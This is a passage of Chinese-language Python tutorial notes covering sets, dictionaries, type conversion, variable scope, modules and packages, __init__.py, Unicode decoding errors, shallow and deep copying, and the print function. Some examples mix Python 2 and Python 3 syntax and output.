一个元素，需要在元素后添加逗号\n```\nstring、list 和 tuple 都属于 sequence（序列）。\n\n注意：\n1. 与字符串一样，元组的元素不能修改。\n2. 元组也可以被索引和切片，方法一样。\n3. 注意构造包含 0 或 1 个元素的元组的特殊语法规则。\n4. 元组也可以使用+操作符进行拼接。\n\n## Set（集合）\n集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。\n基本功能是进行成员关系测试和删除重复元素。\n可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。\n创建格式：\n```\nparame = {value01,value02,...}\n```\n或者\n```\nset(value)\n```\n实例\n```py\n#!/usr/bin/python3\n\nsites = {'Google', 'Taobao', 'Runoob', 'Facebook', 'Zhihu', 'Baidu'}\n\nprint(sites)   # 输出集合，重复的元素被自动去掉\n\n# 成员测试\nif 'Runoob' in sites :\n    print('Runoob 在集合中')\nelse :\n    print('Runoob 不在集合中')\n\n\n# set可以进行集合运算\na = set('abracadabra')\nb = set('alacazam')\n\nprint(a)\n\nprint(a - b)     # a 和 b 的差集\n\nprint(a | b)     # a 和 b 的并集\n\nprint(a & b)     # a 和 b 的交集\n\nprint(a ^ b)     # a 和 b 中不同时存在的元素\n```\n以上实例输出结果：\n```\n{'Zhihu', 'Baidu', 'Taobao', 'Runoob', 'Google', 'Facebook'}\nRunoob 在集合中\n{'b', 'c', 'a', 'r', 'd'}\n{'r', 'b', 'd'}\n{'b', 'c', 'a', 'z', 'm', 'r', 'l', 'd'}\n{'c', 'a'}\n{'z', 'b', 'm', 'r', 'l', 'd'}\n```\n\n### frozenset\nset(可变集合)与frozenset(不可变集合)的区别\nset无序排序且不重复，是可变的，有add（），remove（）等方法。既然是可变的，所以它不存在哈希值。基本功能包括关系测试和消除重复元素. 集合对象还支持union(联合), intersection(交集),difference(差集)和sysmmetric difference(对称差集)等数学运算。不支持索引、切片等序列操作，但仍支持成员关系运算符in-not in、推导式等操作。\n\nfrozenset是冻结的集合，它是不可变的，存在哈希值，好处是<font color=\"red\">它可以作为字典的key，也可以作为其它集合的元素。</font>缺点是一旦创建便不能更改，没有add，remove方法。\n\n### python3中集合的并集等操作\nPython 的集合（set）运算\n数学里集合运算在Python的set中也有对应运算。\n\n#### 子集⊆、真子集⊂\nset的运算`<对应于真子集⊂`，`<=`对应于子集⊆\n```python\n>>> A = {1, 2, 3}\n>>> B = {1, 2, 3, 4, 5}\n>>> A <= B  #判断是否子集\nTrue\n>>> A < B  #判断是否真子集\nTrue\n>>> A <= A\nTrue\n>>> B < A\nFalse\n>>>\n```\n\nset类型的内置函数issubset()同样可以判断是否子集:\n```python\n>>> A.issubset(B)\nTrue\n```\n#### 超集/包含关系⊇、 ⊃\nset的运算>对应于真包含⊃，>=对应于包含⊇，对应的内置函数是issuperset()\n```python\n>>> A = {1, 2, 3}\n>>> B = {1, 2, 3, 4, 5}\n>>> B >= A\nTrue\n>>> B > A\nTrue\n>>> A >= A\nTrue\n>>> A > B\nFalse\n>>> A.issuperset(B)\nFalse\n>>> B.issuperset(A)\nTrue\n>>> \n```\n\n#### 不相交集\n一个集合中的任何一个元素都不属于另一个集合，可以说这两个集合是不相交集（Disjoint sets），也就是说，交集为空 。判断函数是isdisjoint()\n```python\n>>> A = {1, 2, 3}\n>>> B = {1, 2, 3, 4, 5}\n>>> A.isdisjoint(B)\nFalse\n>>>\n```\n\n#### 两集合的交集\nset 的交集 的运算符号是&，采用这个符号是显然的，因为交集运算与位与（bit-wise AND）运算相似。对应的内置函数是intersection()\n```python\n>>> A = {1, 2, 3, 4, 5}\n>>> B = {4, 5, 6, 7, 8}\n>>> A & B\nset([4, 5])\n>>> A.intersection(B)\nset([4, 5])\n>>> \n```\n#### 两集合的并集\nset 的并集的运算符号是|，采用这个符号也是显然的，因为并集运算与位或（bit-wise OR）运算相似。对应的内置函数是union()\n```python\n>>> A = {1, 2, 3, 4, 5}\n>>> B = {4, 5, 6, 7, 8}\n>>> A | B\nset([1, 2, 3, 4, 5, 6, 7, 8])\n>>> A.union(B)\nset([1, 2, 3, 4, 5, 6, 7, 8])\n>>> \n```\n#### 差集（减法）运算\nset的差集运算，也就是从一个集合里减去另一个集合的所有元素，很直接的用减号表示，内置函数是difference()\n```python\n>>> A = {1, 2, 3, 4, 5}\n>>> B = {4, 5, 6, 7, 8}\n>>> A - B\nset([1, 2, 3])\n>>> A.difference(B)\nset([1, 2, 3])\n>>> \n```\n\n#### 对称差集（异或）运算\n数学上，两个集合的对称差(Symmetric difference)是只属于其中一个集合，而不被两个集合同时包含。 例如：集合{1,2,3}和{3,4}的对称差为{1,2,4}。集合论中的这个运算相当于布尔逻辑中的异或运算。所以在Python里使用了异或的符号（^）表示，内置函数为symmetric_difference()\n```python\n>>> A = {1, 2, 3, 4, 5}\n>>> B = {4, 5, 6, 7, 8}\n>>> A ^ B\nset([1, 2, 3, 6, 7, 8])\n>>> A.symmetric_difference(B)\nset([1, 2, 3, 6, 7, 8])\n>>> \n```\n\n#### 集合内置函数的几个特点\n上面介绍的集合内置函数里，有三个判断函数（is开头的函数）和四个运算函数（intersection, union, difference和symmetric_difference），表示运算的函数有下面几个特点：\n1. 可以传递多个参数，表示连续运算\n2. 可以传递除集合外的其他可递归类型（iterable）\n比如\n```python\n>>> A = {1, 2, 3, 4, 5}\n>>> B = {4, 5, 6, 7, 8}\n>>> C = {4, 5, 9, 0}\n>>> A.intersection(B, C)    #连续交集运算\nset([4, 5])\n>>> A & B & C    #连续交集运算\nset([4, 5])\n>>> \n>>> A = [1, 2, 3, 4, 5]\n>>> B = [4, 5, 6, 7, 8]\n>>> set(A).union(B)    #和list作并集\nset([1, 2, 3, 4, 5, 6, 7, 8])\n>>> set('abc').symmetric_difference('cdef')    #字符串也是sequence的一种\nset(['a', 'b', 'e', 'd', 'f'])\n>>> \n```\n\n#### 集合运算的应用\n利用set的运算，我们可以方便的判断两个sequence类型的集合关系：\n```python\n>>> A = [1, 2, 3]\n>>> B = [1, 2, 3, 4, 5]\n>>> set(A) <= set (B)   # list转换类型为set\nTrue\n>>> set(A).issubset(B)   # list转换类型为set\nTrue\n>>> \n```\n\n## Dictionary（字典）\n字典（dictionary）是Python中另一个非常有用的内置数据类型。\n列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。\n字典是一种映射类型，字典用 { } 标识，它是一个无序的 键(key) : 值(value) 的集合。\n键(key)必须使用不可变类型。\n在同一个字典中，键(key)必须是唯一的。\n```py\n#!/usr/bin/python3\n\ndict = {}\ndict['one'] = \"1 - 菜鸟教程\"\ndict[2]     = \"2 - 菜鸟工具\"\n\ntinydict = {'name': 'runoob','code':1, 'site': 'www.runoob.com'}\n\n\nprint (dict['one'])       # 输出键为 'one' 的值\nprint (dict[2])           # 输出键为 2 的值\nprint (tinydict)          # 输出完整的字典\nprint (tinydict.keys())   # 输出所有键\nprint (tinydict.values()) # 输出所有值\n```\n以上实例输出结果：\n```\n1 - 菜鸟教程\n2 - 菜鸟工具\n{'name': 'runoob', 'code': 1, 'site': 'www.runoob.com'}\ndict_keys(['name', 'code', 'site'])\ndict_values(['runoob', 1, 'www.runoob.com'])\n```\n\n**构造函数 dict()**可以直接从键值对序列中构建字典如下：\n```py\n>>> dict([('Runoob', 1), ('Google', 2), ('Taobao', 3)])\n{'Runoob': 1, 'Google': 2, 'Taobao': 3}\n>>> {x: x**2 for x in (2, 4, 6)}\n{2: 4, 4: 16, 6: 36}\n>>> dict(Runoob=1, Google=2, Taobao=3)\n{'Runoob': 1, 'Google': 2, 'Taobao': 3}\n>>>\n```\n另外，字典类型也有一些内置的函数，例如clear()、keys()、values()等。\n注意：\n1. 字典是一种映射类型，它的元素是键值对。\n2. 字典的关键字必须为不可变类型，且不能重复。\n3. 创建空字典使用 { }。\n\n## Python数据类型转换\n有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。\n以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。\n| 函数                    | 描述                                                |\n| ----------------------- | --------------------------------------------------- |\n| `int(x [,base])`        | 将x转换为一个整数                                   |\n| float(x)                | 将x转换到一个浮点数                                 |\n| `complex(real [,imag])` | 创建一个复数                                        |\n| str(x)                  | 将对象 x 转换为字符串                               |\n| repr(x)                 | 将对象 x 转换为表达式字符串                         |\n| eval(str)               | 用来计算在字符串中的有效Python表达式,并返回一个对象 |\n| tuple(s)                | 将序列 s 转换为一个元组                             |\n| list(s)                 | 将序列 s 转换为一个列表                             |\n| set(s)                  | 转换为可变集合                                      |\n| dict(d)                 | 创建一个字典。d 必须是一个 (key, value)元组序列。   |\n| frozenset(s)            | 转换为不可变集合                                    |\n| chr(x)                  | 将一个整数转换为一个字符                            |\n| ord(x)                  | 将一个字符转换为它的整数值                          |\n| hex(x)                  | 将一个整数转换为一个十六进制字符串                  |\n| oct(x)                  | 将一个整数转换为一个八进制字符串                    |\n\n## 关于全局变量与局部变量\n1. 函数内部的变量名如果第一次出现，且出现在=前面，即被视为定义一个局部变量，不管全局域中有没有用到该变量名，函数中使用的将是局部变量，例如：\n```py\nnum = 100\ndef func():\n    num = 123\n    print(num)\n \nfunc()\n```\n输出：\n```\n123\n```\n说明函数中定义的num是一个局部变量，会将全局变量覆盖。再例如：\n\n```py\nnum = 100\ndef func():\n    num += 100\n    print(num)\n \nfunc()\n```\n输出：\n```\nUnboundLocalError: local variable 'num' referenced before assignment\n```\n错误提示局部变量num在赋值前被应用，也就是该变量没有定义就使用它，由此再次证明了这里定义了一个局部变量，而不是使用的全局的num。\n\n**总结：函数内部的变量名如果第一次出现，且出现在=前面，即被视为定义一个局部变量。**\n\n\n2. 函数内部的变量名如果第一次出现，且出现在=后面，且该变量在全局域中已定义，则这里将引用全局变量，如果该变量在全局域中没有定义，当然会出现“变量未定义”的错误。例如：\n```py\nnum = 100\ndef func():\n    x = num + 100\n    print(x)\n \nfunc()\n```\n输出：\n```\n200\n```\n表示这里使用的num是全局变量num。\n\n或者其他使用该变量（例如调用成员函数）的情况，也将引用全局变量，例如：\n```py\na = [1, 2]\ndef func():\n    a.append(3)\n    print(a)\n    \nfunc()\n```\n输出：\n```\n[1, 2, 3]\n```\n**总结：只要是使用变量，而该变量在全局域中有定义，而在局部没有定义，则会使用全局变量。**\n\n3. 函数中使用某个变量时，该变量名既有全局变量也有同名的局部变量，则会使用局部变量，例如：\n```py\nnum = 100\ndef func():\n    num = 200\n    x = num + 100\n    print(x)\n \nfunc()\n```\n结果：\n```\n300\n```\n总结：如果使用的变量在全局域中有定义，在局部域中也有定义，则默认会使用局部变量。\n\n4. 在函数中，如果想给全局变量赋值，则需要用关键字global生命，例如：\n```py\nnum = 100\ndef func():\n    global num\n    num = 200\n    print(num)\n \nfunc()\nprint(num)\n```\n输出：\n```\n200\n200\n```\n说明函数中给num赋值为200是修改的全局变量，而且这里没有定义新的局部变量，所以后续如果再操作num也是操作的全局变量，例如：\n```py\nnum = 100\ndef func():\n    global num\n    num = 200\n    num += 100\n    print(num)\n \nfunc()\nprint(num)\n```\n输出：\n```\n300\n300\n```\n**总结：如果要在函数中给全局变量赋值，需要用global关键字声明。**\n\n# type()与isinstance()\ntype函数的用法很简单，就是type(object)，返回的是传入的object的类型。\nisinstance的用法为: `isinstance(object,type-or-tuple-or-class) -> bool`, 传入的第一个参数为对象，第二个参数为类型名(int,str,float等)或者类型名的一个列表(如(str, str, int)为一个列表)，返回值为一个布尔变量。\n例如：\n```py\n>>> a, b, c, d = 20, 5.5, True, 4+3j\n>>> print(type(a), type(b), type(c), type(d))\n<class 'int'> <class 'float'> <class 'bool'> <class 'complex'>\n\n>>>a = 111\n>>> isinstance(a, int)\nTrue\n```\n\n\n## 两个函数的异同\n**相同点**\n都可以判断变量是否属于某个内建类型。\n\n**不同点**\n1. type只接受一个参数，不仅可以判断变量是否属于某个类型，还可以直接返回参数类型。而isinstance只能判断是否属于某个已知的类型，不能直接得到变量所属的类型。\n\n2. isinstance可以判断子类实例对象是属于父类的；而type会判断子类实例对象和父类类型不一样。\n\n```py\nclass A1(object):\n    pass\n\nclass B1(A1):\n    pass\n\nprint type(A1()) is A1\nprint type(B1()) is A1\nprint isinstance(B1(), A1)\n```\n输出结果为:\n```\nTrue\nFalse\nTrue\n```\n从以上的分析可以看出，type主要是用来获取未知变量的类型，而instance可以用于继承关系的判断\n\n# 变量前加一个星号与2个星号\n在变量前加*，则多余的函数参数会作为一个元组存在args中，如：\n```python\ndef func(*ages):\nfunc(1,2,3) #args表示（1，2，3）这个元组\n```\n如果使用**前缀，多余的参数会被认为是字典\n```python\ndef func(**args):\nfunc(a='1',b='2',c ='3')#args表示{‘a’:'1','b':'2','c':'3'}\n```\n\n给函数传递字典\n```python\nfont = {\n 'family' : 'aa',\n 'ff':'bbb'\n}\nmatplotlib.rc(\"font\",**font)\n# 等价于下面写法\nmatplotlib.rc(\"font\", family='aa', ff='bbb')\n```\n\n\n# 读取键盘输入\n## 读入一行字符串\n```\nline = input()\n\nline1 = input(\"请输入:\")\n```\n## 以空格分隔的数据\n```\n# 用空格获取输入数据的两种方法， map()的返回值是一个迭代器\nnum1 = list(map(int, input().strip().split()))\nnum2 = [int(temp) for temp in input().split()]\n```\n\n\n# python3逗号四大用法\n## 作为参数或变量间的分隔符  \n```python\ndef function(a,b): #参数分隔\n    pass\na,b = 1,2  #变量分隔\n```\n\n## 将变量转换成元组\n```python\na = 1\nb = a,\nprint(a)  #输出转变前\nprint(b)  #输出转变后\n```\nOutput\n```\n1\n(1,)\n```\n\n## 提取只有一个元素的列表、集合、元组中的元素\n```python\na, = (1,)\nb, = [1]\nc, = set({1})\n```\n其中a、b、c变量都是int型变量\n\n注： 只有一个元素的列表、集合、元组中的元素， 否则会报错，如下\n```python\na, = (1,2)\n```\nOutput\n```\nValueError: too many values to unpack (expected 1)\n```\n\n# map() 函数\n**描述**\nmap() 会根据提供的函数对指定序列做映射。\n\n第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。\n\n**语法**\nmap() 函数语法：\n```\nmap(function, iterable, ...)\n```\n**参数**\n- function -- 函数\n- iterable -- 一个或多个序列\n\n**返回值**\nPython 2.x 返回列表。\nPython 3.x 返回迭代器。\n\n**实例**\n以下实例展示了 map() 的使用方法：\n\nPython2.x 实例\n```py\n>>> def square(x) :            # 计算平方数\n...     return x ** 2\n...\n>>> map(square, [1,2,3,4,5])   # 计算列表各个元素的平方\n[1, 4, 9, 16, 25]\n>>> map(lambda x: x ** 2, [1, 2, 3, 4, 5])  # 使用 lambda 匿名函数\n[1, 4, 9, 16, 25]\n\n# 提供了两个列表，对相同位置的列表数据进行相加\n>>> map(lambda x, y: x + y, [1, 3, 5, 7, 9], [2, 4, 6, 8, 10])\n[3, 7, 11, 15, 19]\n```\n\nPython3.x 实例\n```py\n>>> def square(x) :         # 计算平方数\n...     return x ** 2\n...\n>>> map(square, [1,2,3,4,5])    # 计算列表各个元素的平方\n<map object at 0x100d3d550>     # 返回迭代器\n>>> list(map(square, [1,2,3,4,5]))   # 使用 list() 转换为列表\n[1, 4, 9, 16, 25]\n>>> list(map(lambda x: x ** 2, [1, 2, 3, 4, 5]))   # 使用 lambda 匿名函数\n[1, 4, 9, 16, 25]\n>>>\n```\n\n# Python 模块\nPython 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。\n模块让你能够有逻辑地组织你的 Python 代码段。\n把相关的代码分配到一个模块里能让你的代码更好用，更易懂。\n模块能定义函数，类和变量，模块里也能包含可执行的代码。\n\n下例是个简单的模块 support.py：\n```py\ndef print_func( par ):\n   print \"Hello : \", par\n   return\n```\n\n## import 语句\n**模块的引入**\n模块定义好后，我们可以使用 import 语句来引入模块，语法如下：\n```\nimport module1[, module2[,... moduleN]]\n```\n比如要引用模块 math，就可以在文件最开始的地方用 import math 来引入。在调用 math 模块中的函数时，必须这样引用：\n```\n模块名.函数名\n```\n当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。\n\n搜索路径是一个解释器会先进行搜索的所有目录的列表。如想要导入模块 support.py，需要把命令放在脚本的顶端：\n```py\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \n# 导入模块\nimport support\n \n# 现在可以调用模块里包含的函数了\nsupport.print_func(\"Runoob\")\n```\n以上实例输出结果：\n```\nHello : Runoob\n```\n一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。\n\n## from…import 语句\nPython 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中。语法如下：\n```\nfrom modname import name1[, name2[, ... nameN]]\n```\n例如，要导入模块 fib 的 fibonacci 函数，使用如下语句：\n```py\nfrom fib import fibonacci\n```\n这个声明不会把整个 fib 模块导入到当前的命名空间中，它只会将 fib 里的 fibonacci 单个引入到执行这个声明的模块的全局符号表。\n\n## from…import* 语句\n把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：\n```py\nfrom modname import *\n```\n这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。\n\n例如我们想一次性引入 math 模块中所有的东西，语句如下：\n```\nfrom math import *\n```\n\n## 搜索路径\n当你导入一个模块，Python 解析器对模块位置的搜索顺序是：\n1. 当前目录\n2. 如果不在当前目录，Python 则搜索在 shell 变量 PYTHONPATH 下的每个目录。\n3. 如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为/usr/local/lib/python/。\n\n模块搜索路径存储在 system 模块的 sys.path 变量中。变量里包含当前目录，PYTHONPATH和由安装过程决定的默认目录。\n\n## Python中的包\n包是一个分层次的文件目录结构，它定义了一个由模块及子包，和子包下的子包等组成的 Python 的应用环境。\n\n简单来说，包就是文件夹，但该文件夹下必须存在`__init__.py`文件, 该文件的内容可以为空。`__init__.py`用于标识当前文件夹是一个包。\n\n考虑一个在 package_runoob 目录下的 runoob1.py、runoob2.py、`__init__.py`文件，test.py 为测试调用包的代码，目录结构如下：\n```\ntest.py\npackage_runoob\n|-- __init__.py\n|-- runoob1.py\n|-- runoob2.py源代码如下：\n```\npackage_runoob/runoob1.py\n```py\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \ndef runoob1():\n   print \"I'm in runoob1\"\npackage_runoob/runoob2.py\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \ndef runoob2():\n   print \"I'm in runoob2\"\n```\n\n现在，在 package_runoob 目录下创建 `__init__.py`：\n\n`package_runoob/__init__.py`\n```py\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \nif __name__ == '__main__':\n    print '作为主程序运行'\nelse:\n    print 'package_runoob 初始化'\n```\n\n然后我们在 package_runoob 同级目录下创建 test.py 来调用 package_runoob 包\n\ntest.py\n\n```py\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n\n# 导入 Phone 包\nfrom package_runoob.runoob1 import runoob1\nfrom package_runoob.runoob2 import runoob2\n \nrunoob1()\nrunoob2()\n```\n以上实例输出结果：\n```\npackage_runoob 初始化\nI'm in runoob1\nI'm in runoob2\n```\n如上，为了举例，我们只在每个文件里放置了一个函数，但其实你可以放置许多函数。你也可以在这些文件里定义Python的类，然后为这些类建一个包。\n\n# __init__.py 作用详解\n`__init__.py`该文件的作用就是相当于把自身整个文件夹当作一个包来管理，每当有外部import的时候，就会自动执行里面的函数。\n\n## 标识该目录是一个python的模块包（module package）\n\n`__init__.py` 文件的作用是将文件夹变为一个Python模块,Python 中的每个模块的包中，都有__init__.py 文件。\n\n通常__init__.py 文件为空，但是我们还可以为它增加其他的功能。我们在导入一个包时，实际上是导入了它的__init__.py文件。这样我们可以在__init__.py文件中批量导入我们所需要的模块，而不再需要一个一个的导入。\n\n## 简化模块导入操作\n\n假设我们的模块包的目录结构如下：\n\n```\n.\n└── mypackage\n    ├── subpackage_1\n    │   ├── test11.py\n    │   └── test12.py\n    ├── subpackage_2\n    │   ├── test21.py\n    │   └── test22.py\n    └── subpackage_3\n        ├── test31.py\n        └── test32.py\n```\n如果我们使用最直接的导入方式，将整个文件拷贝到工程目录下，然后直接导入：\n```\nfrom mypackage.subpackage_1 import test11\nfrom mypackage.subpackage_1 import test12\nfrom mypackage.subpackage_2 import test21\nfrom mypackage.subpackage_2 import test22\nfrom mypackage.subpackage_3 import test31\nfrom mypackage.subpackage_3 import test32\n```\n这样的话，看起来就会很麻烦，查找的时候也会麻烦，此时`__init__.py`就起到了简化的作用。\n\n### init.py 是怎么工作的？\n实际上，如果目录中包含了`__init__.py`时，当用 import 导入该目录时，会执行`__init__.py`里面的代码。我们在mypackage目录下增加一个`__ init __.py`文件来做一个实验：\n```\n.\n└── mypackage\n    ├── __init__.py\n    ├── subpackage_1\n    │   ├── test11.py\n    │   └── test12.py\n    ├── subpackage_2\n    │   ├── test21.py\n    │   └── test22.py\n    └── subpackage_3\n        ├── test31.py\n        └── test32.py\n```\n\n`mypackage/__init__.py`里面加一个print，如果执行了该文件就会输出\n\n```py\nprint(\"You have imported mypackage\")\n```\n\n下面直接用交互模式进行 import\n\n```py\n>>> import mypackage\nYou have imported mypackage\n```\n\n很显然，`__init__.py`在包被导入时会被执行。\n\n### 控制模块导入\n我们再做一个实验，在 mypackage/init.py 添加以下语句：\n\n```py\nfrom subpackage_1 import test11\n```\n\n我们导入 mypackage 试试:\n\n```py\n>>> import mypackage\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/taopeng/Workspace/Test/mypackage/__init__.py\", line 2, in <module>\n    from subpackage_1 import test11\nImportError: No module named 'subpackage_1'\n```\n\n报错了。。。怎么回事？\n\n原来，在我们执行import时，当前目录是不会变的（就算是执行子目录的文件），还是需要完整的包名。\n\n```\nfrom mypackage.subpackage_1 import test11\n```\n\n综上，我们可以在init.py 指定默认需要导入的模块\n\n### 偷懒的导入方法\n有时候我们在做导入时会偷懒，将包中的所有内容导入\n\n```\nfrom mypackage import *\n```\n\n这是怎么实现的呢？ __all__变量就是干这个工作的。`__all__`关联了一个模块列表，当执行 from xx import * 时，就会导入列表中的模块。我们将`__init__.py`修改为 :\n\n```py\n__all__ = ['subpackage_1', 'subpackage_2']\n```\n这里没有包含 subpackage_3，是为了证明`__all__`起作用了，而不是导入了所有子目录。\n```py\n>>> from mypackage import *\n>>> dir()\n['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'subpackage_1', 'subpackage_2']\n>>> \n>>> dir(subpackage_1)\n['__doc__', '__loader__', '__name__', '__package__', '__path__', '__spec__']\n```\n\n**子目录的中的模块没有导入！！！**该例子中的导入等价于:`from mypackage import subpackage_1, subpackage_2`因此，导入操作会继续查找 subpackage_1 和 subpackage_2 中的`__init__.py`并执行。（但是此时不会执行 import *）\n我们在 subpackage_1 下添加`__init__.py`文件:\n\n```py\n__all__ = ['test11', 'test12']\n# 默认只导入test11\nfrom mypackage.subpackage_1 import test11\n```\n\n再来导入试试\n\n```py\n>>> from mypackage import *\n>>> dir()\n['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'subpackage_1', 'subpackage_2']\n>>> \n>>> dir(subpackage_1)\n['__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__path__', '__spec__', 'test11']\n```\n\n如果想要导入子包的所有模块，则需要更精确指定。\n\n```py\n>>> from mypackage.subpackage_1 import *\n>>> dir()\n['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'test11', 'test\n```\n\n## 配置模块的初始化操作\n\n在了解了`__init__.py`的工作原理后，应该能理解该文件就是一个正常的python代码文件。因此可以将初始化代码放入该文件中。\n\n## __pycache__目录\n\n- __pycache__ 是模块的缓存文件存放目录\n- py代码在执行前，需要被解析器先转换为机器码，然后再执行。\n- 所以我们在使用模块（包）时，也需要将模块的代码先转换为机器码然后再交由计算机执行，\n- 而为了提高程序运行的性能，python会在编译过一次以后，将代码保存到一个缓存文件中，\n- 这样在下次加载这个模块（包）时，就可以不再重新编译而是直接加载缓存中编译好的代码即可。\n\n\n# python3解决UnicodeDecodeError, 'utf-8' 问题\n**问题引出：**\n最近在做一个买房自动化分析Python脚本，需要爬取网页。\n在使用urllib获取reqest的response的时候，还要进行解码。\n见语句：\n```python\nresult = res.decode('utf-8')\n```\n当执行该语句的时候，会造成异常：\n```text\nUnicodeDecodeError: 'utf-8' codec can't decode byte 0xe5 in position 103339: invalid continuation byte\n```\n\n**问题分析**\n该情况是由于出现了无法进行转换的 二进制数据 造成的，可以写一个小的脚本来判断下，是整体的字符集参数选择上出现了问题，还是出现了部分的无法转换的二进制块：\n以读入文件为例：\n```python\nf = open(\"data.txt\",\"rb\")#二进制格式读文件\nwhile True:\n    line = f.readline()\n    if not line:\n        break\n    else:\n        try:\n            #print(line.decode('utf8'))\n            line.decode('utf8')\n            #为了暴露出错误，最好此处不print\n        except:\n            print(str(line))\n```\n手写了一段代码，可以通过这段代码的输出来判断哪里出现了问题。\n\n## method 1\n如果输出的代码都是hex形式的，可能就是你选择的解码字符集出现了错误。 对于python2.7版本的来说，网上有使用这样一种看上去很霸气，其实很low的方式，来处理：\n```python\n#coding=utf8\nimport sys\nreload(sys)\nsys.setdefaultxxxx(\"utf8\")\n```\n其实，这可以看作是python2系列版本的小bug,需要自行重新设置一下默认的编码字符集，如果还要这么设置的话，decode()的参数还拿来干嘛。\n所以，在python3版本中，就已经取消了这个方法。\n\n## method 2\n2.如果是字符集出现错误，建议多选择几种字符集测试一下： 选择的经验是： 如果是爬取到的网页文件，可以查看网页文件的meta标签下的charset属性值。\n例如：\n```python\n<meta charset=\"UTF-8\">\n```\n也可以使用notepad++打开，查看下右下角的部位，会指示该文件是那种编码。\n\n3.有的情况，是这样的，整个文件是好的，如果用notepad++打开后，能够看到文件是可以打开的，似乎什么问题都没有发生过，但是，用python进行解码的时候，却会出现错误。\n我们运行上面的测试脚本，可以看到出现这样的情况：\n```html\n    <li id=\"J_menuHistory\" data-page=\"J_pageHistory\">\n                                    <a><i class=\"icon-history\"></i>播放历史     \\0xe5 </a>\n```                            \n当然，这段代码是我随手写的一个例子，这里，可以注意看到这个0xe5,这是无法转换出来的部分，这是不属于编码字符集中的部分。所以，在进行编码转换的时候，会报错。\n\n## method 3\n修改字符集参数，一般这种情况出现得较多是在国标码(GBK)和utf8之间选择出现了问题。\n出现异常报错是由于设置了decode()方法的第二个参数errors为严格（strict）形式造成的，因为默认就是这个参数，将其更改为ignore等即可。例如:\nline.decode(\"utf8\",\"ignore\")\n\n\n# python3中浅拷贝与深拷贝的实现方式\npython3浅拷贝与深拷贝的实现方式、区别:\n```python\nlist1 = [1,2,3]\nlist2 = list1\nlist1[0] = 0\nprint(list2)\nprint(list1)\n```\n打印的结果:\n```\n[0, 2, 3]\n[0, 2, 3]\n```\n小结:\n通过把一个列表变量名赋值给另一个变量名,只是把一个列表变量名list1的指引赋值给另一个变量名list2,使list1和list2都指向[1,2,3],所以当列表中的一个元素改变了,list1和list2都变了.\n```python\nlist1 = [1,2,3]\nlist2 = list1.copy()\nlist1[0] = 0\nprint(list2)\nprint(list1)\n```\n打印的结果:\n```\n[1, 2, 3]\n[0, 2, 3]\n```\n小结:copy函数是又开辟了一个内存空间,里面放有1,2,3,使list2指向新开辟的内存空间,所以list1的元素变化并不影响list2.\n```python\nlist1 = [[4,5,6],2,3]\nlist2 = list1.copy()\nlist1[0][0] = 0\nprint(list2)\nprint(list1)\n```\n打印结果:\n```\n[[0, 5, 6], 2, 3]\n[[0, 5, 6], 2, 3]\n```\n小结:copy函数有个坑,当列表中嵌套小列表时,用copy函数,外面的大列表开辟了一个新的内存空间,但里面的子列表只是赋值了指引,都指向[4,5,6],所以当作为子列表的整体改变时,两个列表互不影响,当作为子列表的元素改变时,两个列表同改变,那么在这种情况下,怎么实现两个列表互不影响呢?\n```python\nimport copy\nlist1 = [[4,5,6],2,3]\nlist2 = copy.deepcopy(list1)\nlist1[0][0] = 0\nprint(list2)\nprint(list1)\n```\n打印结果:\n```\n[[4, 5, 6], 2, 3]\n[[0, 5, 6], 2, 3]\n```\n小结:当列表中嵌套子列表时,用deepcopy可以开辟大空间同时开辟大空间中的小空间放子列表,实现一个列表中的子列表元素值变化,而另一个列表不变\n\n# python打印和输出\n在编程实践中，print 的使用频率非常高，特别是程序运行到某个时刻，要检测产生的结果时，必须用 print 来打印输出。\n关于 print 函数，前面很多地方已经提及过，可用于写入标准输出。现在，是时候该深入了。\n注意：这里强调的是“print 函数”，而不是“print 语句”。\n\n## 深入 print\n在 Python 2.x 中，print 是一个语句，但是在 Python 3.x 中，它是一个函数。如果 2.x 和 3.x 都使用过，你就会发现差异有多么大。\n进入 3.x 的交互式 shell，尝试使用“print 语句”：\n```python\n[wang@localhost ~]$ python\nPython 3.5.2 (default, Mar 29 2017, 11:05:07) \n[GCC 4.8.5 20150623 (Red Hat 4.8.5-11)] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> \n>>> print 'Python'\n...\nSyntaxError: Missing parentheses in call to 'print'\n```\n\n对于大多数人来说，这个错误信息再熟悉不过了。正如上面所提到的那样，print 是 3.x 中的一个函数，与其他函数一样，参数应该被圆括号括起来：\n```python\n>>> print('Python')\nPython\n```\n\n## print 函数\n要了解 print 函数的用途，可以使用 help() 来寻求帮助：\n```python\n>>> help(print)\n...\nHelp on built-in function print in module builtins:\n\nprint(...)\n    print(value, ..., sep=' ', end='\\n', file=sys.stdout, flush=False)\n\n    Prints the values to a stream, or to sys.stdout by default.\n    Optional keyword arguments:\n    file:  a file-like object (stream); defaults to the current sys.stdout.\n    sep:   string inserted between values, default a space.\n    end:   string appended 